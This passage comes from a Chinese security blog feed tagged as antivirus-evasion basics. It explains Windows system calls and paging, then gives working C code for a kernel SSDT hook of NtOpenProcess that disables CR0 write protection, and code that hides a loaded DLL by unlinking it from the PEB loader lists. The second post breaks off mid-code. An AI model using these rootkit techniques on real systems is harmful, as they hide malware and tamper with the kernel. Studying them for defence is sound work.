<h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><h2 id="KUSER-SHARED-DATA"><a href="#KUSER-SHARED-DATA" class="headerlink" title="_KUSER_SHARED_DATA"></a>_KUSER_SHARED_DATA</h2><p>在 User 层和 Kernel 层分别定义了一个 _KUSER_SHARED_DATA 结构区域，用于 User 层和 Kernel 层共享某些数据，它们使用固定的地址值映射， _KUSER_SHARED_DATA 结构区域在 User 和 Kernel 层地址分别为</p>
<p><strong>User 层地址为：0x7ffe0000</strong></p>
<p><strong>Kernel 层地址为：0xffdf0000</strong></p>
<p>先来看一下ring0，首先用<code>kd&gt; dt _KUSER_SHARED_DATA 0xffdf0000</code></p>
<p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/image-20231016215300616.png" alt="image-20231016215300616"></p>
<p>接着是用户层</p>
<p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/image-20231016215447701.png" alt="image-20231016215447701"></p>
<p>用户层和内核层的_KUSER_SHARED_DATA物理页是相同的，虽然指向的是同一个物理页，但在 User 层是只读的，在 Kernel 层是可写的。</p>
<h2 id="CR3寄存器"><a href="#CR3寄存器" class="headerlink" title="CR3寄存器"></a>CR3寄存器</h2><p>CR3是一个寄存器，该寄存器内保存有页目录表物理地址，其实CR3内部存放的就是页目录表的内存基地址，运用CR3切换可实现对特定进程内存地址的强制读写操作。</p>
<p>Cr3寄存器不同于其他寄存器，在所有的寄存器中，只有Cr3寄存器存储的地址是物理地址，其他寄存器存储的都是线性地址。</p>
<p>Cr3寄存器所存储的物理地址指向了一个页目录表（Page-Directory Table，PDT），也就是所查找时的第一级。在Windows中，一个页的大小通常为4KB，即一个页（页目录表）可以存储1024个页目录表项（PDE）而第二级为页表(PTT)， 每个页表的大小为4KB，即一个页表可以存储1024个页表项（PTE）。</p>
<p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/20161002130508241#pic_center.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PDE 结构</span><br><span class="line">|&lt;------ 31~12------&gt;|&lt;------ 11~0 ---------&gt;| 比特</span><br><span class="line">                     |b a 9 8 7 6 5 4 3 2 1 0| </span><br><span class="line">|--------------------|-|-|-|-|-|-|-|-|-|-|-|-| 占位</span><br><span class="line">|&lt;-------index------&gt;| AVL |G|P|0|A|P|P|U|R|P| 属性</span><br><span class="line">                             |S|   |C|W|/|/|</span><br><span class="line">                                   |D|T|S|W|</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PTE 结构</span><br><span class="line">|&lt;------ 31~12------&gt;|&lt;------ 11~0 ---------&gt;| 比特</span><br><span class="line">                     |b a 9 8 7 6 5 4 3 2 1 0|</span><br><span class="line">|--------------------|-|-|-|-|-|-|-|-|-|-|-|-| 占位</span><br><span class="line">|&lt;-------index------&gt;| AVL |G|P|D|A|P|P|U|R|P| 属性</span><br><span class="line">                             |A|   |C|W|/|/|</span><br><span class="line">                             |T|   |D|T|S|W|</span><br></pre></td></tr></table></figure>

<p>这个地方当P位为1时，其物理页才有效，R&#x2F;W为可读可写位，当值为1则证明属性为可读可写，U&#x2F;S位表示特权位，U&#x2F;S &#x3D; 0为特权用户，U&#x2F;S &#x3D; 1为普通用户。</p>
<h2 id="如何判断是否支持系统调用"><a href="#如何判断是否支持系统调用" class="headerlink" title="如何判断是否支持系统调用"></a>如何判断是否支持系统调用</h2><p>当通过 eax&#x3D;1 来执行 cpuid 指令时，处理器的特征信息被放在ecx和edx寄存器中，其中 edx 包含了一个 SEP 位（11位），该位指明了当前处理器是否支持 sysenter&#x2F;sysexit 指令。<strong>支持函数用系统调用会使用ntdll.dll!KiFastSystemCall()不支持则使ntdll.dll!KiIntSystemCall()。</strong></p>
<p>在我们了解了 KUSER_SHARED_DATA 结构体后，就可以知道call的实际上是 Systemcall 的地址，通过反汇编查看，通过 sysenter 指令（快速调用）进入0环。操作系统会在系统启动的时候在KUSER_SHARED_DATA 结构体的+300的位置，写入一个函数，这个函数就是 KiFastSystemCall 或者KiIntSystemCall 。</p>
<h3 id="进入0环"><a href="#进入0环" class="headerlink" title="进入0环"></a>进入0环</h3><p>进0环需要更改CS、SS、ESP、EIP四个寄存器。</p>
<p><strong>CS的权限由3变为0 意味着需要新的CS</strong></p>
<p><strong>SS与CS的权限永远一致 需要新的SS</strong></p>
<p><strong>权限发生切换的时候，堆栈也一定会切换，需要新的ESP</strong></p>
<p><strong>进0环后代码的位置，需要EIP</strong></p>
<p>如果使用中断门通过 0x2E 的中断号最终进入了 KiSystemService 这个内核模块。使用过sysenter，即快速调用进入内核。中断门进0环，需要的CS、EIP在IDT表中，需要查内存(SS与ESP由TSS提供)。而CPU如果支持sysenter指令时，操作系统会提前将CS&#x2F;SS&#x2F;ESP&#x2F;EIP的值存储在MSR寄存器中，sysenter指令执行时，CPU会将MSR寄存器中的值直接写入相关寄存器，没有读内存的过程，所以叫快速调用，本质是一样的。</p>
<table>
<thead>
<tr>
<th>API通过中断门进0环</th>
<th>API通过sysenter指令进0环</th>
</tr>
</thead>
<tbody><tr>
<td>(1)固定中断号为0x2E，(2)CS&#x2F;EIP由门描述符提供 ESP&#x2F;SS由TSS提供，(3)进入0环后执行的内核函数：NT!KiSystemService。</td>
<td>(1)CS&#x2F;ESP&#x2F;EIP由MSR寄存器提供(SS是算出来的)。(2)进入0环后执行的内核函数：NT!KiFastCallEntry</td>
</tr>
</tbody></table>
<h1 id="SSDT-hook"><a href="#SSDT-hook" class="headerlink" title="SSDT hook"></a>SSDT hook</h1><p>现在可以步入正题，介绍SSDT hook了。</p>
<h2 id="使用CR4寄存器判断分页模式"><a href="#使用CR4寄存器判断分页模式" class="headerlink" title="使用CR4寄存器判断分页模式"></a>使用CR4寄存器判断分页模式</h2><p>这里函数准备好以后，就要将该函数的指针覆盖原来 NtOpenProcess 的指针，但是需要注意的是：自己改自己的代码是不用管权限的，改别人的代码很有可能这块内存是只读的，并不可写。那么本质上就是SSDT对应的物理页是只读的，这里有两种办法，我们都知道物理页的内存R&#x2F;W位的属性是由PDE和PTE相与而来的，那么我们就可以改变SSDT对应的PDE和PTE的R&#x2F;W属性，将物理页设置为可读可写的。通过CR4寄存器判断是2-9-9-12分页还是10-10-12分页。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(RCR4 &amp; 0x00000020) &#123;//说明是2-9-9-12分页 </span><br><span class="line">KdPrint((&quot;2-9-9-12分页 %p\n&quot;,RCR4));</span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp;0x007FFFF8))));</span><br><span class="line">*(DWORD64*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp; 0x007FFFF8)) |= 0x02;</span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 9) &amp;0x007FFFF8))));</span><br><span class="line">&#125;else &#123;//说明是10-10-12分页 </span><br><span class="line">KdPrint((&quot;10-10-12分页\n&quot;)); </span><br><span class="line">KdPrint((&quot;PTE1 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC))));</span><br><span class="line">*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp; 0x003FFFFC)) |= 0x02;</span><br><span class="line">KdPrint((&quot;PTE2 %p\n&quot;,*(DWORD*)(0xC0000000 + ((HookFunAddr &gt;&gt; 10) &amp;0x003FFFFC)))); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用CR0寄存器使内存有写入权限"><a href="#使用CR0寄存器使内存有写入权限" class="headerlink" title="使用CR0寄存器使内存有写入权限"></a>使用CR0寄存器使内存有写入权限</h2><p>使用 PsGetCurrentThread() 函数可获取当前 KTHREAD 的首地址但是需要注意的是SSDT表所在的内存页属性是只读，没有写入的权限，所以需要把该地址设置为可写入，这样才能写入自己的函数，使用的是CR0寄存器关闭只读属性。</p>
<p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1paSGluY2x1ZGU=,size_16,color_FFFFFF,t_70#pic_center.png" alt="img"></p>
<p>可以看到这里使用32位寄存器，而在CR0寄存器中，重点关注的是3个标志位：</p>
<p>PE ：是否启用保护模式，置1则启用。</p>
<p>PG ：是否使用分页模式，置1则开启分页模式, 此标志置1时，PE 标志也必须置1，否则CPU报异常。</p>
<p>WP： 为1时，不能修改只读的内存页，WP为0时，可以修改只读的内存页。</p>
<p>所以在进行hook时，只要把CR0寄存器中的WP位置为0，就能对内存进行写入操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//关闭页只读保护 </span><br><span class="line">__asm&#123;</span><br><span class="line">	push eax;</span><br><span class="line">	mov eax, cr0;</span><br><span class="line">	and eax, ~0x10000; // 与0x10000相与后取反</span><br><span class="line">	mov cr0, eax;</span><br><span class="line">	pop eax; </span><br><span class="line">	ret; </span><br><span class="line">&#125; </span><br><span class="line">//开启页只读保护 </span><br><span class="line">__asm&#123; </span><br><span class="line">	push eax;</span><br><span class="line">	mov eax, cr0; </span><br><span class="line">	or eax, 0x10000;</span><br><span class="line">	mov cr0, eax;</span><br><span class="line">	pop eax;</span><br><span class="line">	ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在可以编写实现代码了。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>本代码目的是要监测进程强杀的恶意程序，所以我们最好来监测ZwOpenProcess而非TermialProcess，因为终止程序并非只有TerminalProcess还有用TerminalThread终止所有进程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;ntddk.h&gt;</span><br><span class="line">#include &lt;ntstatus.h&gt;</span><br><span class="line">// 记录原函数的地址 </span><br><span class="line">ULONG uOldNtOpenProcess; </span><br><span class="line">//内核之SSDT-HOOK</span><br><span class="line">//系统服务表 </span><br><span class="line">typedef struct _KSYSTEM_SERVICE_TABLE &#123;</span><br><span class="line">PULONG ServiceTableBase; //函数地址表的首地址</span><br><span class="line">PULONG ServiceCounterTableBase;//函数表中每个函数被调用的次数 </span><br><span class="line">ULONG NumberOfService; //服务函数的个数 </span><br><span class="line">ULONG ParamTableBase; //参数个数表首地址</span><br><span class="line">&#125;KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE; </span><br><span class="line">//服务描述符 </span><br><span class="line">typedef struct _KSERVICE_TABLE_DESCRIPTOR &#123;</span><br><span class="line">	KSYSTEM_SERVICE_TABLE ntoskrnl;//ntoskrnl.exe的服务函数,SSDT</span><br><span class="line">	KSYSTEM_SERVICE_TABLE win32k; //win32k.sys的服务函数,ShadowSSDT</span><br><span class="line">	KSYSTEM_SERVICE_TABLE notUsed1;//暂时没用1</span><br><span class="line">	KSYSTEM_SERVICE_TABLE notUsed2;//暂时没用2 </span><br><span class="line">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR; </span><br><span class="line">//定义HOOK的函数的类型 </span><br><span class="line">typedef NTSTATUS(NTAPI* FuZwOpenProcess)( </span><br><span class="line">	_Out_ PHANDLE ProcessHandle, </span><br><span class="line">	_In_ ACCESS_MASK DesiredAccess,</span><br><span class="line">	_In_ POBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class="line">	_In_opt_ PCLIENT_ID ClientId </span><br><span class="line">	); </span><br><span class="line">//自写的函数声明 </span><br><span class="line">NTSTATUS NTAPI MyZwOpenProcess(</span><br><span class="line">	_Out_ PHANDLE ProcessHandle, </span><br><span class="line">	_In_ ACCESS_MASK DesiredAccess,</span><br><span class="line">	_In_ POBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class="line">	_In_opt_ PCLIENT_ID ClientId</span><br><span class="line">);</span><br><span class="line">// KeServiceDescriptorTable 为 ntoskrnl.exe 所导出的全局变量 </span><br><span class="line">extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;</span><br><span class="line">//记录系统的该函数 </span><br><span class="line">FuZwOpenProcess g_OldZwOpenProcess; </span><br><span class="line">//服务描述符表指针</span><br><span class="line">KSERVICE_TABLE_DESCRIPTOR* g_pServiceTable = NULL; </span><br><span class="line">//要保护进程的ID</span><br><span class="line">ULONG g_Pid = 1324; </span><br><span class="line">//安装钩子</span><br><span class="line">NTSTATUS HookNtOpenProcess(); </span><br><span class="line">//卸载钩子 </span><br><span class="line">NTSTATUS UnHookNtOpenProcess(); </span><br><span class="line">//关闭页写入保护 </span><br><span class="line">void ShutPageProtect(); </span><br><span class="line">//开启页写入保护</span><br><span class="line">void OpenPageProtect(); </span><br><span class="line">//卸载驱动 </span><br><span class="line">void DriverUnload(DRIVER_OBJECT* obj);  </span><br><span class="line">NTSTATUS DriverEntry(DRIVER_OBJECT* driver, UNICODE_STRING* path) &#123;</span><br><span class="line">KdPrint((&quot;驱动启动成功！\n&quot;)); </span><br><span class="line">//安装钩子 </span><br><span class="line">HookNtOpenProcess();</span><br><span class="line">driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">//卸载驱动</span><br><span class="line">void DriverUnload(DRIVER_OBJECT* obj) &#123;</span><br><span class="line">	//卸载钩子</span><br><span class="line">	UnHookNtOpenProcess(); </span><br><span class="line">	KdPrint((&quot;驱动卸载成功！\n&quot;)); </span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS HookNtOpenProcess() &#123; </span><br><span class="line">	NTSTATUS Status; Status = STATUS_SUCCESS; </span><br><span class="line">	//1.关闭页只读保护</span><br><span class="line">	ShutPageProtect(); </span><br><span class="line">	//2.修改SSDT表 </span><br><span class="line">	uOldNtOpenProcess = KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0x7a];</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0x7a] = (ULONG)MyZwOpenProcess;</span><br><span class="line">	//3.开启页只读保护 </span><br><span class="line">	OpenPageProtect(); </span><br><span class="line">	return Status; </span><br><span class="line">&#125;</span><br><span class="line">//卸载钩子</span><br><span class="line">NTSTATUS UnHookNtOpenProcess() &#123;</span><br><span class="line">	NTSTATUS status; status = STATUS_SUCCESS; </span><br><span class="line">	//1.关闭页只读保护</span><br><span class="line">	ShutPageProtect(); </span><br><span class="line">	//2.写入原来的函数到SSDT表内</span><br><span class="line">	KeServiceDescriptorTable-&gt;ntoskrnl.ServiceTableBase[0x7a] = uOldNtOpenProcess;</span><br><span class="line">	//3.开启页只读保护</span><br><span class="line">	OpenPageProtect();</span><br><span class="line">	return status;</span><br><span class="line">&#125;</span><br><span class="line">//关闭页只读保护</span><br><span class="line">void _declspec(naked) ShutPageProtect() &#123;</span><br><span class="line"></span><br><span class="line">	__asm &#123;</span><br><span class="line">		push eax; </span><br><span class="line">		mov eax, cr0;</span><br><span class="line">		and eax, ~0x10000;</span><br><span class="line">		mov cr0, eax; </span><br><span class="line">		pop eax; </span><br><span class="line">		ret; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line">//开启页只读保护</span><br><span class="line">void _declspec(naked) OpenPageProtect() &#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		push eax;</span><br><span class="line">		mov eax, cr0; </span><br><span class="line">		or eax, 0x10000;</span><br><span class="line">		mov cr0, eax;</span><br><span class="line">		pop eax; </span><br><span class="line">		ret; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line">//自写的函数 </span><br><span class="line">NTSTATUS NTAPI MyZwOpenProcess( </span><br><span class="line">	_Out_ PHANDLE ProcessHandle,</span><br><span class="line">	_In_ ACCESS_MASK DesiredAccess,</span><br><span class="line">	_In_ POBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class="line">	_In_opt_ PCLIENT_ID ClientId</span><br><span class="line">)&#123;</span><br><span class="line">	//当此进程为要保护的进程时</span><br><span class="line">	if (ClientId-&gt;UniqueProcess == (HANDLE)g_Pid) &#123; </span><br><span class="line">		//设为拒绝访问</span><br><span class="line">		 DesiredAccess = 0;</span><br><span class="line">	&#125;</span><br><span class="line">//调用原函数</span><br><span class="line">	return NtOpenProcess(ProcessHandle,DesiredAccess,ObjectAttributes,ClientId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><p><img src="/images/%E5%88%9D%E8%AF%95SSDT-hook/image-20231017114927446.png" alt="image-20231017114927446"></p>
<p>可以看到PCHunker中的Ring0 Hooks已经检测到NtOpenProcess地址被篡改，代码执行成功。</p>
]]></content>
      <categories>
        <category>免杀基础</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>进程隐藏与强杀</title>
    <url>/2023/09/22/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/</url>
    <content><![CDATA[<p>​	进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。在Unix System V及SunOS中也被称为轻量进程（lightweight processes），但轻量进程更多指内核线程（kernel thread），而把用户线程（user thread）称为线程。</p>
<span id="more"></span>

<h1 id="一、3环断链隐藏"><a href="#一、3环断链隐藏" class="headerlink" title="一、3环断链隐藏"></a>一、3环断链隐藏</h1><h2 id="1-1基本原理"><a href="#1-1基本原理" class="headerlink" title="1.1基本原理"></a>1.1基本原理</h2><p>​		每个线程都有一个TEB结构来存储线程的一些属性结构，TEB的地址用fs:[0]来获取。而在0x30这个地址有一个指针指向PEB结构，PEB就是进程用来记录自己信息的一个结构。在PEB的0x00c偏移有一个_PEB_LDR_DATA结构。结构中提供如下3个双向链表。</p>
<p>InLoadOrderModuleList ：模块加载的顺序、</p>
<p>InMemoryOrderModuleList ：模块在内存的顺序</p>
<p>InInitializationOrderModuleList ：模块初始化的顺序</p>
<p>注意：</p>
<p>(1)x86下，fs:[0x0]寄存器在ring3指向TEB结构，TEB+0x30处指向PEB结构，PEB+0x0c处指向PEB_LDR_DATA结构，PEB_LDR_DATA+0x1c处为InInitializationOrderModuleList。</p>
<p>(2)x64下，gs:[0x30]寄存器在ring3指向TEB结构，TEB+0x60处指向PEB结构，PEB+0x18处指向PEB_LDR_DATA结构，PEB_LDR_DATA+0x30处为 InInitializationOrderModuleList。</p>
<p>​		当我们从 _PEB_LDR_DATA 结构中取到 InInitializationorderModuleList 结构时，这个结构中的Flink 指向真正的模块链表，这个真正的链表的每个成员都是一个 LDR_DATA_TABLE_ENTRY 结构。之前的 _PEB_LDR_DATA 只是一个入口，这个结构只有一个，它不是链表节点。_LDR_DATA_TABLE_ENTRY结构中的 _LIST_ENTRY 结构对应下一个 _LDR_DATA_TABLE_ENTRY节点中的 _LIST_ENTRY 结构。如：第一个 _LDR_DATA_TABLE_ENTRY 结构中的 InInitializationOrderModuleList 中的 Flink 指向的是第二个 _LDR_DATA_TABLE_ENTRY 结构中 InInitializationOrderModuleList 的首地址，而不是另外两个 _LIST_ENTRY 结构。第一个__LDR_DATA_TABLE_ENTRY 结构中的 Blink 指向 PEB_LDR_DATA 中对应成员的 Blink 。最后一个 _LDR_DATA_TABLE_ENTRY 结构中的 Flink 指向 PEB_LDR_DATA 中对应的成员的 Flink。 PEB_LDR_DATA 结构中的 Blink 指向最后一个 _LDR_DATA_TABLE_ENTRY 中对应成员的 Blink 。PEB_LDR_DATA 结构中的 Flink 指向第一个_LDR_DATA_TABLE_ENTRY 中对应的成员的 Flink。</p>
<h2 id="1-2代码实现"><a href="#1-2代码实现" class="headerlink" title="1.2代码实现"></a>1.2代码实现</h2><p>​		API是通过找_PEB_LDR_DATA这个结构来获取程序有哪些模块，所以通过修改这几个双向链表就可以实现隐藏某个dll。_DRIVER_OBJECT 结构体中 0x014的偏移有一个成员， DriverSection 可以实现对内核模块的遍历。 DriverSection 是一个指针，实际上是对应着一个结构体： _LDR_DATA_TABLE_ENTRY。在 _LDR_DATA_TABLE_ENTRY 的0x018偏移处有一个 DllBase ，这里存放的就是dll的地址。因此，我们如果要想隐藏某个指定的dll，就可以通过 DllBase 的方式，通过 GetModuleHandleA 获取dll的句柄，来进行比对。</p>
<h3 id="1-2-1代码实现步骤"><a href="#1-2-1代码实现步骤" class="headerlink" title="1.2.1代码实现步骤"></a>1.2.1代码实现步骤</h3><p>具体代码实现步骤可以分为如下几步：</p>
<p>（1）首先定义 _PEB_LDR_DATA 和 _LDR_DATA_TABLE_ENTRY 结构。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// LDR链表头 </span><br><span class="line">typedef struct _PEB_LDR_DATA &#123;</span><br><span class="line">	DWORD Length; </span><br><span class="line">	bool Initialized; PVOID SsHandle;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList; // 指向了 InLoadOrderModuleList 链表的第一项 </span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList; </span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList; </span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA;</span><br><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY &#123;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList; </span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList; </span><br><span class="line">	void* BaseAddress; </span><br><span class="line">	void* EntryPoint;</span><br><span class="line">	ULONG SizeOfImage;</span><br><span class="line">	UNICODE_STRING FullDllName;</span><br><span class="line">	UNICODE_STRING BaseDllName; </span><br><span class="line">	ULONG Flags;</span><br><span class="line">	SHORT LoadCount; </span><br><span class="line">	SHORT TlsIndex;</span><br><span class="line">	HANDLE SectionHandle;</span><br><span class="line">	ULONG CheckSum;</span><br><span class="line">	ULONG TimeDateStamp; </span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>（2）然后通过汇编定位到LDR。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">mov eax,fs:[0x30] // PEB</span><br><span class="line">mov ecx,[eax + 0x0c] // LDR</span><br><span class="line">mov ldr,ecx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（3）通过获取到的ldr结构指向 InLoadOrderModuleList。（以InLoadOrderModuleList为例）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br></pre></td></tr></table></figure>

<p>（4）然后通过 CONTAINING_RECORD 这个宏返回结构体基址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cur = Head-&gt;Flink;</span><br><span class="line">ldte = CONTAINING_RECORD( Cur, LDR_DATA_TABLE_ENTRY, </span><br><span class="line">InInitializationOrderModuleList);</span><br></pre></td></tr></table></figure>

<p>（5）进行断链操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ldte-&gt;InInitializationOrderModuleList.Blink-&gt;Flink = ldte- &gt;InInitializationOrderModuleList.Flink;</span><br><span class="line">ldte-&gt;InInitializationOrderModuleList.Flink-&gt;Blink = ldte- &gt;InInitializationOrderModuleList.Blink;</span><br></pre></td></tr></table></figure>

<p>（6）后将指针指向下一个结构.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cur = Cur-&gt;Flink;</span><br></pre></td></tr></table></figure>

<p>（7）如果想隐藏全部</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void HideModule_All()&#123;</span><br><span class="line">	PPEB_LDR_DATA ldr; </span><br><span class="line">	PLDR_DATA_TABLE_ENTRY ldte; // 获取LDR</span><br><span class="line">	__asm &#123; </span><br><span class="line">		mov eax,fs:[0x30] </span><br><span class="line">		mov ecx,[eax + 0x0c] </span><br><span class="line">		mov ldr,ecx </span><br><span class="line">	&#125;</span><br><span class="line">	PLIST_ENTRY Head; </span><br><span class="line">	Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">	Head-&gt;Flink = Head-&gt;Blink = Head; </span><br><span class="line">	Head = &amp;(ldr-&gt;InMemoryOrderModuleList); </span><br><span class="line">	Head-&gt;Flink = Head-&gt;Blink = Head;</span><br><span class="line">	Head = &amp;(ldr-&gt;InInitializationOrderModuleList); </span><br><span class="line">	Head-&gt;Flink = Head-&gt;Blink = Head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-2全部代码实现"><a href="#1-2-2全部代码实现" class="headerlink" title="1.2.2全部代码实现"></a>1.2.2全部代码实现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt; </span><br><span class="line">typedef struct _UNICODE_STRING &#123; </span><br><span class="line">	USHORT Length; </span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING; </span><br><span class="line">typedef struct _PEB_LDR_DATA &#123; </span><br><span class="line">	DWORD Length;</span><br><span class="line">	bool Initialized;</span><br><span class="line">	PVOID SsHandle;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; </span><br><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY &#123; </span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList; </span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList; </span><br><span class="line">	void* BaseAddress; </span><br><span class="line">	void* EntryPoint;</span><br><span class="line">	ULONG SizeOfImage; </span><br><span class="line">	UNICODE_STRING FullDllName;</span><br><span class="line">	UNICODE_STRING BaseDllName;</span><br><span class="line">	ULONG Flags; </span><br><span class="line">	SHORT LoadCount;</span><br><span class="line">	SHORT TlsIndex;</span><br><span class="line">	HANDLE SectionHandle;</span><br><span class="line">	ULONG CheckSum; </span><br><span class="line">	ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY; </span><br><span class="line">void HideModule(HMODULE hModule) &#123;</span><br><span class="line">	PPEB_LDR_DATA ldr; </span><br><span class="line">	PLDR_DATA_TABLE_ENTRY ldte;</span><br><span class="line">	__asm &#123; </span><br><span class="line">		mov eax, fs: [0x30] </span><br><span class="line">		mov ecx, [eax + 0x0c]</span><br><span class="line">		mov ldr, ecx </span><br><span class="line">	&#125;</span><br><span class="line">	PLIST_ENTRY Head, Cur;</span><br><span class="line">	Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">	Cur = Head-&gt;Flink;</span><br><span class="line">	do &#123; </span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);</span><br><span class="line">		if (ldte-&gt;BaseAddress == hModule) &#123; </span><br><span class="line">			ldte-&gt;InLoadOrderModuleList.Blink-&gt;Flink = ldte -&gt; InLoadOrderModuleList.Flink;</span><br><span class="line">			ldte-&gt;InLoadOrderModuleList.Flink-&gt;Blink = ldte -&gt; InLoadOrderModuleList.Blink; </span><br><span class="line">		&#125;Cur = Cur-&gt;Flink;</span><br><span class="line">	&#125; while (Head != Cur); </span><br><span class="line">	Head = &amp;(ldr-&gt;InMemoryOrderModuleList);</span><br><span class="line">	Cur = Head-&gt;Flink; </span><br><span class="line">	do &#123; </span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList);</span><br><span class="line">		if (ldte-&gt;BaseAddress == hModule) &#123;</span><br><span class="line">			ldte-&gt;InMemoryOrderModuleList.Blink-&gt;Flink = ldte -&gt; InMemoryOrderModuleList.Flink; </span><br><span class="line">			ldte-&gt;InMemoryOrderModuleList.Flink-&gt;Blink = ldte -&gt; InMemoryOrderModuleList.Blink; </span><br><span class="line">		&#125;Cur = Cur-&gt;Flink;</span><br><span class="line">	&#125; while (Head != Cur);</span><br><span class="line">	Head = &amp;(ldr-&gt;InInitializationOrderModuleList);</span><br><span class="line">	Cur = Head-&gt;Flink;</span><br><span class="line">	do &#123; </span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InInitializationOrderModuleList);</span><br><span class="line">		if (ldte-&gt;BaseAddress == hModule) &#123; </span><br><span class="line">			ldte-&gt;InInitializationOrderModuleList.Blink-&gt;Flink = ldte -&gt; InInitializationOrderModuleList.Flink; </span><br><span class="line">			ldte-&gt;InInitializationOrderModuleList.Flink-&gt;Blink = ldte -&gt; InInitializationOrderModuleList.Blink;</span><br><span class="line">		&#125;</span><br><span class="line">		Cur = Cur-&gt;Flink;</span><br><span class="line">	&#125; while (Head != Cur);</span><br><span class="line">&#125;int main(int argc, CHAR* argv[]) &#123; </span><br><span class="line">	printf(&quot;please enter any key to continue&quot;);</span><br><span class="line">	getchar(); </span><br><span class="line">	HideModule(GetModuleHandleA(&quot;kernel32.dll&quot;));</span><br><span class="line">	